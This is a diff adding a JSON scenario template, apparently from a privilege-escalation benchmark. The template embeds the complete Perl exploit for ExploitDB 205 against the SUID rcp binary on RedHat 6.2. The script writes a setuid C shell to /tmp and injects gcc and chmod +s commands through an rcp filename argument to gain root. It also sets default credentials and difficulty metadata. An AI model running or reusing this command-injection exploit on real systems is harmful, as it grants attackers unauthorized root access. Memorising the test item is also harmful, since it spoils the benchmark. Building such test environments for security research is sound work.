@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_205",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: RedHat 6.2 /usr/bin/rcp - 'SUID' Local Privilege Escalation\n\nExploit source code (205.pl):\n```\n#!/usr/bin/perl -w\n#\n# exploits suid privledges on rcp\n# Not really tested this but hey\n# works on redhat6.2\n# not werk on freebsd4.1 stable\n#\n# bug discovered by\n# Andrew Griffiths\n#\n# Exploit written by tlabs\n# greetz to those that know me innit\n#\n# Please set your rcpfile\n# this can be found by doing\n#\n# ls -alF `which rcp`\n#\n# have a lot of fun\n\n$RCPFILE=\"/usr/bin/rcp\" ;\n\n# configure above innit\n\nsub USAGE\n{\n    print \"$0\\nWritten by Tlabs\\n\" ;\n    exit 0 ;\n}\n\nif ( ! -u \"$RCPFILE\" )\n{\n    printf \"rcp is not suid, quiting\\n\" ;\n    exit 0;\n}\n\nopen(TEMP, \">>/tmp/shell.c\")|| die \"Something went wrong: $!\" ;\nprintf TEMP \"#include<unistd.h>\\n#include<stdlib.h>\\nint main()\\n{\" ;\nprintf TEMP \"    setuid(0);\\n\\tsetgid(0);\\n\\texecl(\\\"/bin/sh\\\",\\\"sh\\\",0);\\n\\treturn 0;\\n}\\n\" ;\nclose(TEMP);\nopen(HMM, \">hey\")|| die \"Something went wrong: $!\";\nprint HMM \"Sploit written by tlabs, thanks to Andrew Griffiths for the bug report\" ;\nclose(HMM);\n\nsystem \"rcp 'hey geezer; gcc -o /tmp/shell /tmp/shell.c;' localhost 2> /dev/null\" ;\nsystem \"rcp 'hey geezer; chmod +s /tmp/shell;' localhost 2> /dev/null\" ;\nunlink(\"/tmp/shell.c\");\nunlink(\"hey\");\nunlink(\"geezer\");\nprintf \"Ok, too easy, we'll just launch a shell, lets hope shit went well, innit:)\\n\" ;\n\nexec '/tmp/shell' ;\n\n\n# milw0rm.com [2000-11-29]\n```",
+  "cve": "",
+  "exploitdb_id": "205",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_205",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
